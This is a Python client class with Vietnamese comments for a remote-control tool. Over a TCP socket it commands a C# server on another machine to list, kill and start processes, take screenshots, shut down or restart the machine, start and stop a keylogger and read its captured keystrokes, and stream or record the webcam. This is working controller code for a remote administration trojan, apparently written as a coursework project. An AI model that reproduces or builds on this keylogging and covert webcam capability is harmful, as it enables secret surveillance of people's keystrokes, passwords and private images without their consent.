import socket
import json
import time
import threading # Thêm threading để xử lý khóa (lock) tránh treo

class PersistentRemoteClient:
    _instances = {}
    
    # --- THÊM KHÓA LOCK ĐỂ TRÁNH XUNG ĐỘT GIỮA STREAM VÀ LỆNH KHÁC ---
    _lock = threading.Lock()

    def __init__(self, host, port, timeout=60):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket = None
        self.connected = False
        # Xóa self.reader và self.writer vì chúng gây lỗi UTF-8 với dữ liệu Video

    @classmethod
    def get_or_create(cls, session_id, host, port, timeout=60):
        """
        Factory method: Lấy client instance cho session_id, nếu chưa có thì tạo mới
        """
        if session_id not in cls._instances:
            instance = cls(host, port, timeout)
            try:
                instance.connect()
                cls._instances[session_id] = instance
            except:
                return None
        else:
            # Kiểm tra xem connection còn sống không
            instance = cls._instances[session_id]
            if not instance.connected:
                try:
                    instance.connect()
                except:
                    # Nếu connect lại thất bại thì xóa instance lỗi đi
                    del cls._instances[session_id]
                    return None
                    
        return cls._instances[session_id]

    @classmethod
    def disconnect_session(cls, session_id):
        if session_id in cls._instances:
            client = cls._instances[session_id]
            client.disconnect()
            del cls._instances[session_id]

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(self.timeout)
        self.socket.connect((self.host, self.port))
        self.connected = True
        # KHÔNG tạo makefile nữa để tránh lỗi decode UTF-8

    def disconnect(self):
        if self.socket:
            try:
                # Gửi lệnh QUIT trước khi đóng
                self.socket.sendall(b"QUIT\n") # Dùng sendall thay vì writer.write
                self.socket.close()
            except:
                pass
        self.socket = None
        self.connected = False

    # ==================== CÁC HÀM HỖ TRỢ RAW SOCKET (MỚI) ====================
    # Những hàm này thay thế cho self.reader/writer để an toàn với Video/Ảnh
    
    def _send_str(self, text):
        """Gửi string an toàn"""
        if not text.endswith('\n'): text += '\n'
        self.socket.sendall(text.encode('utf-8'))

    def _recv_line(self):
        """Đọc 1 dòng text, không đọc lấn sang phần binary"""
        line = b''
        while True:
            try:
                char = self.socket.recv(1)
                if not char: break
                if char == b'\n': break
                line += char
            except socket.timeout:
                break
        return line.decode('utf-8', errors='ignore').strip()

    def _recv_bytes(self, num_bytes):
        """Đọc chính xác số bytes binary (cho ảnh/video)"""
        data = b''
        while len(data) < num_bytes:
            chunk = self.socket.recv(min(4096, num_bytes - len(data)))
            if not chunk: break
            data += chunk
        return data
    # =========================================================================

    def send_command(self, command_type, sub_command=None, args=None):
        """
        Gửi lệnh và nhận phản hồi
        command_type: PROCESS, APPLICATION, KEYLOG, TAKEPIC, SHUTDOWN...
        """
        if not self.connected:
            return {"status": "error", "message": "Not connected"}
        
        # Dùng lock để đảm bảo không ai chen ngang khi đang gửi lệnh này
        # (Đặc biệt quan trọng khi đang bật Webcam Stream)
        with self._lock:
            try:
                # Gửi loại lệnh chính
                self._send_str(command_type) # Thay cho writer.write

                response_data = None
                status = "error"
                msg = ""

                # --- Xử lý logic từng loại lệnh (GIỮ NGUYÊN LOGIC CŨ) ---
                
                if command_type == "PROCESS" or command_type == "APPLICATION":
                    if sub_command == "XEM":
                        self._send_str("XEM")
                        
                        # Đọc số lượng
                        count_str = self._recv_line() # Thay cho reader.readline
                        if count_str.isdigit():
                            count = int(count_str)
                            data_list = []
                            for _ in range(count):
                                # Đọc từng dòng thông tin process
                                p_name = self._recv_line()
                                p_id = self._recv_line()
                                p_threads = self._recv_line()
                                
                                data_list.append({
                                    "name": p_name,
                                    "id": p_id,
                                    "threads": p_threads
                                })
                            response_data = data_list
                            status = "success"
                    
                    elif sub_command == "KILL":
                        self._send_str("KILL")
                        self._send_str("KILLID")
                        self._send_str(str(args)) # args là ID
                        msg = self._recv_line()
                        status = "success"
                        
                    elif sub_command == "START":
                        self._send_str("START")
                        self._send_str("STARTID")
                        # Map tên app thông dụng (giữ nguyên logic cũ)
                        app_name = str(args)
                        aliases = {
                            "edge": "msedge",
                            "chrome": "chrome",
                            "coc coc": "browser",
                            "word": "winword",
                            "excel": "excel",
                            "powerpoint": "powerpnt",
                            "notepad": "notepad",
                            "calc": "calc",
                            "paint": "mspaint",
                            "cmd": "cmd"
                        }
                        if app_name.lower() in aliases:
                            app_name = aliases[app_name.lower()]
                            
                        self._send_str(app_name)
                        msg = self._recv_line()
                        status = "success"
                    
                    # Gửi QUIT để kết thúc phiên lệnh con
                    self._send_str("QUIT")

                elif command_type == "TAKEPIC":
                    self._send_str("TAKE")
                    # Đọc kích thước ảnh
                    size_str = self._recv_line()
                    if size_str.isdigit():
                        size = int(size_str)
                        if size > 0:
                            # Đọc dữ liệu ảnh (Binary) - Dùng hàm mới an toàn
                            img_data = self._recv_bytes(size)
                            # Convert sang base64 để gửi về frontend
                            import base64
                            response_data = base64.b64encode(img_data).decode('utf-8')
                            status = "success"
                    self._send_str("QUIT")

                elif command_type == "KEYLOG":
                    if sub_command == "PRINT":
                        self._send_str("PRINT")
                        response_data = self._recv_line()
                        status = "success"
                    elif sub_command == "HOOK":
                        self._send_str("HOOK")
                        status = "success"
                        msg = "Keylogger started"
                    elif sub_command == "UNHOOK":
                        self._send_str("UNHOOK")
                        status = "success"
                        msg = "Keylogger stopped"
                    elif sub_command == "CLEAR":
                        self._send_str("CLEAR")
                        msg = self._recv_line()
                        status = "success"
                    elif sub_command == "STATUS":
                        self._send_str("STATUS")
                        response_data = self._recv_line()
                        status = "success"
                    self._send_str("QUIT")

                elif command_type == "SHUTDOWN":
                    # Server C# sẽ tự shutdown máy
                    status = "success"
                    self._send_str("QUIT")

                elif command_type == "RESTART":
                    status = "success"
                    self._send_str("QUIT")

                return {
                    "status": status,
                    "data": response_data,
                    "message": msg
                }
            
            except Exception as e:
                self.connected = False
                return {"status": "error", "message": str(e)}

    # ==================== PHẦN WEBCAM CỦA BẠN (Đã sửa I/O an toàn) ====================

    def webcam_on(self):
        if not self.connected: return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("WEBCAM")
                self._send_str("ON")
                response = self._recv_line()
                return {"success": response == "CAMERA_ON", "message": response}
            except Exception as e: return {"success": False, "message": str(e)}

    def webcam_off(self):
        if not self.connected: return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("WEBCAM")
                self._send_str("OFF")
                response = self._recv_line()
                self._send_str("QUIT")
                return {"success": response == "CAMERA_OFF", "message": response}
            except Exception as e: return {"success": False, "message": str(e)}

    def webcam_get_frame(self):
        """
        Lấy frame cho streaming.
        Dùng lock không chặn (blocking=False) để tránh treo UI nếu đang Start/Stop recording
        """
        if not self.connected: return None
        
        # Nếu đang bận gửi lệnh khác (ví dụ Start Rec), bỏ qua frame này để tránh treo
        if not self._lock.acquire(blocking=False):
            return None
            
        try:
            self._send_str("WEBCAM")
            self._send_str("GET_FRAME")
            
            size_str = self._recv_line()
            # Kiểm tra size hợp lệ
            if not size_str.isdigit():
                self._send_str("QUIT")
                return None
            
            size = int(size_str)
            if size == 0:
                self._send_str("QUIT")
                return None
            
            # Đọc binary an toàn
            frame_data = self._recv_bytes(size)
            self._send_str("QUIT")
            return frame_data
        except Exception:
            return None
        finally:
            self._lock.release()

    def webcam_start_recording(self):
        if not self.connected: return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("WEBCAM")
                self._send_str("START_REC")
                response = self._recv_line()
                self._send_str("QUIT") # Thoát module webcam để trả về root menu
                return {"success": response == "RECORDING_STARTED", "message": response}
            except Exception as e: return {"success": False, "message": str(e)}

    def webcam_stop_recording(self):
        if not self.connected: return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("WEBCAM")
                self._send_str("STOP_REC")
                
                # Format trả về: "RECORDING_STOPPED|filename|filesize"
                response = self._recv_line()
                
                if not response.startswith("RECORDING_STOPPED"):
                    self._send_str("QUIT")
                    return {"success": False, "message": response}
                
                parts = response.split('|')
                filename = parts[1] if len(parts) > 1 else "video.avi"
                
                # Server gửi tiếp 1 dòng chứa size thật của file
                size_check = self._recv_line()
                if not size_check.isdigit():
                    self._send_str("QUIT")
                    return {"success": False, "message": "Protocol Error: Invalid size"}
                
                real_size = int(size_check)
                if real_size > 0:
                    # ĐỌC FILE VIDEO (BINARY) - Đây là chỗ hay gây lỗi UTF-8 nhất
                    video_data = self._recv_bytes(real_size)
                else:
                    video_data = b''

                self._send_str("QUIT")
                
                return {
                    "success": True, 
                    "message": "Saved", 
                    "filename": filename, 
                    "file_size": real_size, 
                    "video_data": video_data
                }
            except Exception as e:
                return {"success": False, "message": str(e)}

    def webcam_status(self):
        if not self.connected: return {"camera_on": False, "recording": False}
        with self._lock:
            try:
                self._send_str("WEBCAM")
                self._send_str("STATUS")
                response = self._recv_line()
                self._send_str("QUIT")
                # Parse: "camera_on:true|recording:false"
                parts = response.split('|')
                is_on = "true" in parts[0] if len(parts) > 0 else False
                is_rec = "true" in parts[1] if len(parts) > 1 else False
                return {"camera_on": is_on, "recording": is_rec}
            except: 
                return {"camera_on": False, "recording": False}